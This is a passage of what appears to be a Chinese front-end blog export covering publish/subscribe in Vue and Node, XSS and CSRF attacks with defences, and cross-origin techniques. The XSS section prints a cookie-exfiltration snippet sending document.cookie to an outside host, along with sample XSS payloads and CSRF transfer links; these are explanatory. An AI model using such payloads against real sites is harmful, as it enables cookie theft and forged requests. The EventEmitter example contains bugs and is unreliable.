观察者模式通常用于同步的场景，而发布/订阅模式大多用于异步场景，例如消息队列。 到这里，肯定会有小伙伴问，为什么没有发布/订阅模式的代码实例。其实在很多JS框架中，都采用发布/订阅模式进行了不少设计，下面我们就从Vue和Node来深入讲一讲关于发布/订阅的使用。 Vue中的发布/订阅设计Vue中使用到发布/订阅模式最经典的两块实现就是数据双向绑定和父子组件通信。 数据双向绑定vue数据双向绑定是通过数据劫持结合发布者-订阅者模式的方式来实现的。具体实现数据双向绑定会需要三个步骤： 实现一个监听器Observer，用来劫持并监听所有属性，如果有变动的，就通知订阅者。 实现一个订阅者Watcher，每一个Watcher都绑定一个更新函数，watcher可以收到属性的变化通知并执行相应的函数，从而更新视图。 实现一个解析器Compile，可以扫描和解析每个节点的相关指令（v-model，v-on等指令），如果节点存在v-model，v-on等指令，则解析器Compile初始化这类节点的模板数据，使之可以显示在视图上，然后初始化相应的订阅者（Watcher）。 数据劫持Vue中，利用 Object.defineProperty() 实现数据劫持，监听到数据的变化。12345678Object.defineProperty(data, key, &#123; set: function (value) &#123; //... &#125;, get: function () &#123; //... &#125;&#125;) 实现ObserverObserver是一个数据监听器,用来监听所有的属性。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768function Observer(data) &#123; this.data = data; this.walk(data);&#125;Observer.prototype = &#123; walk: function(data) &#123; var self = this; //遍历对象，获得对象所有属性的监听 Object.keys(data).forEach(function(key) &#123; self.defineReactive(data, key, data[key]); &#125;); &#125;, defineReactive: function(data, key, val) &#123; var dep = new Dep(); // 递归遍历所有子属性 var childObj = observe(val); Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function getter () &#123; if (Dep.target) &#123; // 在这里添加一个订阅者，有关Dep.target的获得，会在watcher中实现 dep.addSub(Dep.target); &#125; return val; &#125;, // setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。 set: function setter (newVal) &#123; if (newVal === val) &#123; return; &#125; val = newVal; // 新的值是object的话，进行监听 childObj = observe(newVal); dep.notify(); &#125; &#125;); &#125;&#125;;function observe(value, vm) &#123; if (!value || typeof value !== &apos;object&apos;) &#123; return; &#125; return new Observer(value);&#125;;// 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后在属性变化的时候执行对应订阅者的更新函数function Dep () &#123; this.subs = [];&#125;Dep.prototype = &#123; /** * [订阅器添加订阅者] * @param &#123;[Watcher]&#125; sub [订阅者] */ addSub: function(sub) &#123; this.subs.push(sub); &#125;, // 通知订阅者数据变更 notify: function() &#123; this.subs.forEach(function(sub) &#123; sub.update(); &#125;); &#125;&#125;;Dep.target = null; 实现Watcherwatcher就是一个订阅者，里面包含了添加订阅者到消息队列和接收响应发布者的通知。1234567891011121314151617181920212223242526function Watcher(vm, exp, cb) &#123; this.cb = cb; this.vm = vm; this.exp = exp; this.value = this.get(); // 将自己添加到订阅器的操作&#125;Watcher.prototype = &#123; update: function() &#123; this.run(); &#125;, run: function() &#123; var value = this.vm.data[this.exp]; var oldVal = this.value; if (value !== oldVal) &#123; this.value = value; this.cb.call(this.vm, value, oldVal); &#125; &#125;, get: function() &#123; Dep.target = this; // 缓存自己 var value = this.vm.data[this.exp] // 强制执行监听器里的get函数 Dep.target = null; // 释放自己 return value; &#125;&#125;; 参数解释： cb：订阅者绑定的更新函数。 vm：Vue实例化的对象。 exp：节点的v-model或v-on：click等指令的属性值。 关联Observer和Watcher12345678910111213141516171819202122232425262728function SelfVue (data, el, exp) &#123; this.data = data; observe(data); el.innerHTML = this.data[exp]; // 初始化模板数据的值 new Watcher(this, exp, function (value) &#123; el.innerHTML = value; &#125;); return this;&#125;&lt;body&gt; &lt;h1 id=&quot;name&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;script src=&quot;js/observer.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;js/watcher.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;js/index.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; var ele = document.querySelector(&apos;#name&apos;); var selfVue = new SelfVue(&#123; name: &apos;hello world&apos; &#125;, ele, &apos;name&apos;); window.setTimeout(function () &#123; console.log(&apos;name值改变了&apos;); selfVue.data.name = &apos;canfoo&apos;; &#125;, 2000);&lt;/script&gt; 其实到这里我们就已经实现了vue的数据双向绑定，从这个绑定过程，我们也很明确看到发布/订阅模式是如何起作用的。本文主要围绕两种设计模式展开，有关compile解析节点的部分，在这里就不做细讲，感兴趣的小伙伴可以继续深入源码探究。 父子组件通信Vue的父子组件通信也用到了发布/订阅模式。 A组件通过 $on 订阅观察特定事件 B组件通过 $emit 将变化广播给其他订阅观察对应事件的组件，并调用他们的方法 123456789101112131415161718192021222324Vue.prototype.$on = function (event: string | Array&lt;string&gt;, fn: Function): Component &#123; const vm: Component = this if (Array.isArray(event)) &#123; for (let i = 0, l = event.length; i &lt; l; i++) &#123; this.$on(event[i], fn) &#125; &#125; else &#123; (vm._events[event] || (vm._events[event] = [])).push(fn) &#125; return vm&#125;Vue.prototype.$emit = function (event: string): Component &#123; const vm: Component = this let cbs = vm._events[event] if (cbs) &#123; cbs = cbs.length &gt; 1 ? toArray(cbs) : cbs const args = toArray(arguments, 1) for (let i = 0, l = cbs.length; i &lt; l; i++) &#123; cbs[i].apply(vm, args) &#125; &#125; return vm&#125; Node中的发布/订阅设计Node中有一个EventEmiter模块，其消息机制采用的就是发布/订阅思想，下面我们来手写一个EventEmiter类。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class EvenEmiter&#123; construct() &#123; this._events = &#123;&#125;; this.defaultMaxListener = 10; &#125; setMaxListner(n) &#123; this._maxListeners = n; &#125; getMaxListener() &#123; return this._maxListeners ? this.maxListeners : this.defaultMaxListeners; &#125; once(eventName, callback) &#123; wrap(...args) &#123; callback(...args); this.removeListener(eventName,callback); &#125; wrap.cb = callback; this.on(eventName, wrap); &#125; on(eventName, callback) &#123; if (!this._events) &#123; this._events = &#123;&#125; &#125; if (this._events[eventName]) &#123; this._events[eventName].push(callback); &#125; else &#123; this._events[eventName] = [callback]; &#125; &#125; emit(eventName) &#123; if (this._events[eventName]) &#123; this._events[eventName].forEach((fn) =&gt; &#123; fn() &#125;); &#125; &#125; removeListener(eventName, callback) &#123; if (this._events[eventName]) &#123; this._events = this._events.filter(fn =&gt; &#123; return fn !== callback; &#125;) &#125; &#125; addEvnetListener(eventName, callback) &#123; this.on(eventName, callback); &#125;&#125; 以上就是有关观察者模式和发布/订阅模式的全部内容，如果有补充和有错的地方，欢迎大家留言。 参考链接：vue的双向绑定原理及实现node 订阅发布及实现]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS，vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS、CSRF攻击问题详解]]></title>
    <url>%2FXSS%E3%80%81CSRF%E6%94%BB%E5%87%BB%E9%97%AE%E9%A2%98%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[一个好的网站，需要经得起Hacker的各种攻击，不久前在公司里给手上的项目做过一次安全性能的大升级，这次就专门来总结一下Web常见的一些安全攻击及其解决方法。 XSS（Cross Site Script）XSS原理XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。 常见场景存储型存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。 input标签中注入script语句攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。当然不能直接把用户的 cookie 直接 alert 出来，因为同源策略严格限制了 JavaScript 的跨域访问，但同源策略并不限制 &lt;img&gt; 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 &lt;img&gt;，通过这个 &lt;img&gt; 发cookie到自己的服务器。123var img=document.createElement(&quot;img&quot;);img.src=&quot;http://web.com/log?&quot;+escape(document.cookie);document.body.appendChild(img); URL内注入script语句攻击直接将类似获取 cookie 等操作的语句通过 script 标签写在URL链接里，请求访问后台。1http://test.php?x=&lt;script&gt;alert(&apos;chenie&apos;)&lt;/script&gt; 反射型反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。12345678910111213&lt;a href=&quot;localhost:8001/?q=111&amp;p=222&quot; &gt;test&lt;/a&gt;const http = require(&apos;http&apos;);function handleReequest(req, res) &#123; res.setHeader(&apos;Access-Control-Allow-Origin&apos;, &apos;*&apos;); res.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/html; charset=UTF-8&apos;&#125;); res.write(&apos;&lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;&apos;); res.end();&#125; const server = new http.Server();server.listen(8001, &apos;127.0.0.1&apos;);server.on(&apos;request&apos;, handleReequest); 当用户点击恶意链接时，页面跳转到攻击者预先准备的页面，会发现在攻击者的页面执行了 js 脚本。 基于DOM型基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。 a标签中123&lt;a href=&quot;http://www.evil.com/?test=&quot; οnclick=alert(1)&quot;&quot; &gt;test&lt;/a&gt;&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&quot; &gt;test&lt;/a&gt;&lt;a href=# οnclick=&quot;funcA(&apos;&apos;);alert(/xss/);//&apos;)&quot; &gt;test&lt;/a&gt; CSS中12body &#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;body &#123;background-image:expression(alert(/xss/));&#125; 解决方案HttpOnly 防止劫取 Cookie在网站的Cookie加上HttpOnly属性1Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly 这样浏览器就禁止JavaScript的读取了。 XSS Filter输入过滤过滤用户输入的 检查用户输入的内容中是否有非法内容。如&lt;&gt;（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&amp;（&amp; 符号）、+（加号）等。12345678const decodingMap = &#123; &apos;&amp;lt;&apos;: &apos;&lt;&apos;, &apos;&amp;gt;&apos;: &apos;&gt;&apos;, &apos;&amp;quot;&apos;: &apos;&quot;&apos;, &apos;&amp;amp;&apos;: &apos;&amp;&apos;, &apos; &apos;: &apos;\n&apos;&#125; 可以利用下面这些函数对出现xss漏洞的参数进行过滤 htmlspecialchars() 函数,用于转义处理在页面上显示的文本。 htmlentities() 函数,用于转义处理在页面上显示的文本。 strip_tags() 函数,过滤掉输入、输出里面的恶意标签。 header() 函数,使用header(“Content-type:application/json”); 用于控制 json 数据的头部，不用于浏览。 urlencode() 函数,用于输出处理字符型参数带入页面链接中。 intval() 函数用于处理数值型参数输出页面中。 OWASP Esapi 的 encodeForCSS()、encodeForHTML()、encodeForJavaScript() 输出检查用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。 CSRF（Cross Site Request Forgery）CSRF原理可缩写为CSRF或者XSRF，是一种劫持受信任用户向服务器发送非预期请求的攻击方式。通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。 CSRF 特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 常见场景在a标签中1&lt;a href=&quot;www.icbc.com.cn/transfer?toBankId=黑客的账户&amp;money=金额&quot;&gt; 这得先知道icbc.com.cn的转账操作的url和参数名称。如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。 在img标签中1&lt;img src=&quot;www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&amp;money=金额&quot;&gt; 只要用户打开了这个页面，不点击任何东西，就会发生转账操作。 解决方案验证码验证码被认为是对抗 CSRF 攻击最简洁而有效的防御方法。CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击但验证码并不是万能的，因为出于用户考虑，不能给网站所有的操作都加上验证码。因此，验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。 Referer Check根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的”源”。比如某银行的转账是通过用户访问http://www.xxx.com/transfer.do页面完成的，用户必须先登录www.xxx.com，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是提交按钮所在页面的URL（本例为www.xxx. com/transfer.do）。如果攻击者要对银行网站实施CSRF攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的Referer的值是其他网站的地址，而不是银行转账页面的地址。因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 www.xx.om 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。12345String referer = request.getHeader(&quot;Referer&quot;);if (referer !== &apos;http://www.c.com:8002/&apos;) &#123; res.write(&apos;csrf 攻击&apos;); return;&#125; 添加 token 验证用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。页面提交的请求携带这个Token，服务器验证Token是否正确。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域问题及其解决方式]]></title>
    <url>%2F%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E5%8F%8A%E5%85%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F.html</url>
    <content type="text"><![CDATA[跨域可能是每个前端攻城狮在工作中不可避免会遇到的问题，在阅读了前辈们的解读后，本文将对跨域问题做一个总结。 跨域的产生跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。而导致跨域问题的产生，来自于浏览器的同源策略。 同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。 同源策略限制内容有： Cookie、LocalStorage、IndexedDB 等存储性内容 DOM 节点 AJAX 请求发送后，结果被浏览器拦截了 但是有三个标签是允许跨域加载资源：123&lt;img src=XXX&gt;&lt;link href=XXX&gt;&lt;script src=XXX&gt; 常见跨域场景 注意点： 如果是协议和端口造成的跨域问题“前台”是无能为力的。 在跨域问题上，仅仅是通过“URL的首部”来识别而不会根据域名对应的IP地址是否相同来判断。“URL的首部”可以理解为“协议, 域名和端口必须匹配”。 跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了。 跨域解决方案JSONPJSONP原理利用 &lt;script&gt; 标签没有跨域限制的漏洞，网页可以得到从其他来源动态产生的 JSON 数据。JSONP请求一定需要对方的服务器做支持才可以。 JSONP优缺点JSONP优点是简单兼容性好，可用于解决主流浏览器的跨域数据访问的问题。缺点是仅支持get方法具有局限性,不安全可能会遭受XSS攻击。 JSONP的实现流程 声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。 创建一个 &lt;script&gt; 标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。 服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是show(‘我不爱你’)。 最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;JSONP 实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;divCustomers&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;function callbackFunction(result, methodName)&#123; var html = &apos;&lt;ul&gt;&apos;; for(var i = 0; i &lt; result.length; i++) &#123; html += &apos;&lt;li&gt;&apos; + result[i] + &apos;&lt;/li&gt;&apos;; &#125; html += &apos;&lt;/ul&gt;&apos;; document.getElementById(&apos;divCustomers&apos;).innerHTML = html;&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&apos;Content-type: application/json&apos;);//获取回调函数名$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//json数据$json_data = &apos;[&quot;customername1&quot;,&quot;customername2&quot;]&apos;;//输出jsonp格式的数据echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;?&gt; 在开发中可能会遇到多个 JSONP 请求的回调函数名是相同的，这时候就需要自己封装一个 JSONP函数。12345678910111213141516171819202122232425// index.htmlfunction jsonp(&#123; url, params, callback &#125;) &#123; return new Promise((resolve, reject) =&gt; &#123; let script = document.createElement(&apos;script&apos;) //对重名回调函数做更新 window[callback] = function(data) &#123; resolve(data) document.body.removeChild(script) &#125; params = &#123; ...params, callback &#125; // wd=b&amp;callback=show let arrs = [] for (let key in params) &#123; arrs.push(`$&#123;key&#125;=$&#123;params[key]&#125;`) &#125; script.src = `$&#123;url&#125;?$&#123;arrs.join(&apos;&amp;&apos;)&#125;` document.body.appendChild(script) &#125;)&#125;jsonp(&#123; url: &apos;http://localhost:3000/say&apos;, params: &#123; wd: &apos;Iloveyou&apos; &#125;, callback: &apos;show&apos;&#125;).then(data =&gt; &#123; console.log(data)&#125;) jQuery的JSONP形式JSONP都是GET和异步请求的，不存在其他的请求方式和同步请求，且jQuery默认就会给JSONP的请求清除缓存。12345678910$.ajax(&#123; url:&quot;http://crossdomain.com/jsonServerResponse&quot;, dataType:&quot;jsonp&quot;, type:&quot;get&quot;,//可以省略 jsonpCallback:&quot;show&quot;,//-&gt;自定义传递给服务器的函数名，而不是使用jQuery自动生成的，可省略 jsonp:&quot;callback&quot;,//-&gt;把传递函数名的那个形参callback，可省略 success:function (data)&#123; console.log(data); &#125;&#125;); CORSCORS 需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现。浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。服务端设置 Access-Control-Allow-Origin 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。虽然设置 CORS 和前端没什么关系，但是通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为简单请求和复杂请求。 简单请求只要同时满足以下两大条件，就属于简单请求 使用下列方法之一： GETHEADPOST Content-Type 的值仅限于下列三者之一： text/plainmultipart/form-dataapplication/x-www-form-urlencoded 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。123456GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 Access-Control-Allow-Origin：它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials：它的值是一个布尔值，表示是否允许发送Cookie，默认值为false。 Access-Control-Expose-Headers：想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。 复杂请求不符合以上条件的请求就肯定是复杂请求了。 复杂请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,该请求是 option 方法的，通过该请求来知道服务端是否允许跨域请求。下面是这个”预检”请求的HTTP头信息。12345678OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... Access-Control-Request-Method：用来列出浏览器的CORS请求会用到哪些HTTP方法。 Access-Control-Request-Headers：指定浏览器CORS请求会额外发送的头信息字段。 服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。123456789101112HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain Access-Control-Allow-Methods：它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。 Access-Control-Allow-Headers：是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。 Access-Control-Allow-Credentials：该字段与简单请求时的含义相同。 Access-Control-Max-Age：该字段可选，用来指定本次预检请求的有效期，单位为秒。 一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 postMessagepostMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题： 页面和其打开的新窗口的数据传递 多窗口之间消息传递 页面与嵌套的iframe消息传递 上面三个场景的跨域数据传递 postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。123456789101112131415161718// a.html &lt;iframe src=&quot;http://localhost:4000/b.html&quot; frameborder=&quot;0&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;&lt;/iframe&gt; //等它加载完触发一个事件 //内嵌在http://localhost:3000/a.html &lt;script&gt; function load() &#123; let frame = document.getElementById(&apos;frame&apos;) frame.contentWindow.postMessage(&apos;我爱你&apos;, &apos;http://localhost:4000&apos;) //发送数据 window.onmessage = function(e) &#123; //接受返回数据 console.log(e.data) //我不爱你 &#125; &#125; &lt;/script&gt;// b.html window.onmessage = function(e) &#123; console.log(e.data) //我爱你 e.source.postMessage(&apos;我不爱你&apos;, e.origin) &#125; websocketWebsocket是HTML5的一个持久化的协议，它实现了浏览器与服务器的全双工通信，同时也是跨域的一种解决方案。WebSocket 在建立连接时需要借助 HTTP 协议，连接建立好了之后 client 与 server 之间的双向通信就与 HTTP 无关了。12345678910111213141516171819202122// socket.html&lt;script&gt; let socket = new WebSocket(&apos;ws://localhost:3000&apos;); socket.onopen = function () &#123; socket.send(&apos;我爱你&apos;);//向服务器发送数据 &#125; socket.onmessage = function (e) &#123; console.log(e.data);//接收服务器返回的数据 &#125;&lt;/script&gt;// server.jslet express = require(&apos;express&apos;);let app = express();let WebSocket = require(&apos;ws&apos;);//记得安装wslet wss = new WebSocket.Server(&#123;port:3000&#125;);wss.on(&apos;connection&apos;,function(ws) &#123; ws.on(&apos;message&apos;, function (data) &#123; console.log(data); ws.send(&apos;我不爱你&apos;) &#125;);&#125;) Node中间件代理(两次跨域)实现原理：同源策略是浏览器需要遵循的标准，而如果是服务器向服务器请求就无需遵循同源策略。 代理服务器，需要做以下几个步骤： 接受客户端请求 。 将请求转发给服务器。 拿到服务器响应数据。 将响应转发给客户端。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// index.html(http://127.0.0.1:5500) &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $.ajax(&#123; url: &apos;http://localhost:3000&apos;, type: &apos;post&apos;, data: &#123; name: &apos;xiamen&apos;, password: &apos;123456&apos; &#125;, contentType: &apos;application/json;charset=utf-8&apos;, success: function(result) &#123; console.log(result) // &#123;&quot;title&quot;:&quot;fontend&quot;,&quot;password&quot;:&quot;123456&quot;&#125; &#125;, error: function(msg) &#123; console.log(msg) &#125; &#125;) &lt;/script&gt;// server1.js 代理服务器(http://localhost:3000)const http = require(&apos;http&apos;)// 第一步：接受客户端请求const server = http.createServer((request, response) =&gt; &#123; // 代理服务器，直接和浏览器直接交互，需要设置CORS 的首部字段 response.writeHead(200, &#123; &apos;Access-Control-Allow-Origin&apos;: &apos;*&apos;, &apos;Access-Control-Allow-Methods&apos;: &apos;*&apos;, &apos;Access-Control-Allow-Headers&apos;: &apos;Content-Type&apos; &#125;) // 第二步：将请求转发给服务器 const proxyRequest = http .request( &#123; host: &apos;127.0.0.1&apos;, port: 4000, url: &apos;/&apos;, method: request.method, headers: request.headers &#125;, serverResponse =&gt; &#123; // 第三步：收到服务器的响应 var body = &apos;&apos; serverResponse.on(&apos;data&apos;, chunk =&gt; &#123; body += chunk &#125;) serverResponse.on(&apos;end&apos;, () =&gt; &#123; console.log(&apos;The data is &apos; + body) // 第四步：将响应结果转发给浏览器 response.end(body) &#125;) &#125; ) .end()&#125;)server.listen(3000, () =&gt; &#123; console.log(&apos;The proxyServer is running at http://localhost:3000&apos;)&#125;)// server2.js(http://localhost:4000)const http = require(&apos;http&apos;)const data = &#123; title: &apos;fontend&apos;, password: &apos;123456&apos; &#125;const server = http.createServer((request, response) =&gt; &#123; if (request.url === &apos;/&apos;) &#123; response.end(JSON.stringify(data)) &#125;&#125;)server.listen(4000, () =&gt; &#123; console.log(&apos;The server is running at http://localhost:4000&apos;)&#125;) nginx反向代理实现原理类似于Node中间件代理，需要你搭建一个中转nginx服务器，用于转发请求。使用nginx反向代理实现跨域，是最简单的跨域方式。只需要修改nginx的配置即可解决跨域问题，支持所有浏览器，支持session，不需要修改任何代码，并且不会影响服务器性能。 实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。 1234567891011121314// proxy服务器server &#123; listen 81; server_name www.domain1.com; location / &#123; proxy_pass http://www.domain2.com:8080; #反向代理 proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名 index index.html index.htm; # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用 add_header Access-Control-Allow-Origin http://www.domain1.com; #当前端只跨域不带cookie时，可为* add_header Access-Control-Allow-Credentials true; &#125;&#125; 最后通过命令行nginx -s reload启动nginx1234567891011121314151617181920212223// index.htmlvar xhr = new XMLHttpRequest();// 前端开关：浏览器是否读写cookiexhr.withCredentials = true;// 访问nginx中的代理服务器xhr.open(&apos;get&apos;, &apos;http://www.domain1.com:81/?user=admin&apos;, true);xhr.send();// server.jsvar http = require(&apos;http&apos;);var server = http.createServer();var qs = require(&apos;querystring&apos;);server.on(&apos;request&apos;, function(req, res) &#123; var params = qs.parse(req.url.substring(2)); // 向前台写cookie res.writeHead(200, &#123; &apos;Set-Cookie&apos;: &apos;l=a123456;Path=/;Domain=www.domain2.com;HttpOnly&apos; // HttpOnly:脚本无法读取 &#125;); res.write(JSON.stringify(params)); res.end();&#125;);server.listen(&apos;8080&apos;);console.log(&apos;Server is running at port 8080...&apos;); 参考链接：九种跨域方式实现原理（浪里行舟）]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从ECMAScript规范解读this]]></title>
    <url>%2F%E4%BB%8EECMAScript%E8%A7%84%E8%8C%83%E8%A7%A3%E8%AF%BBthis.html</url>
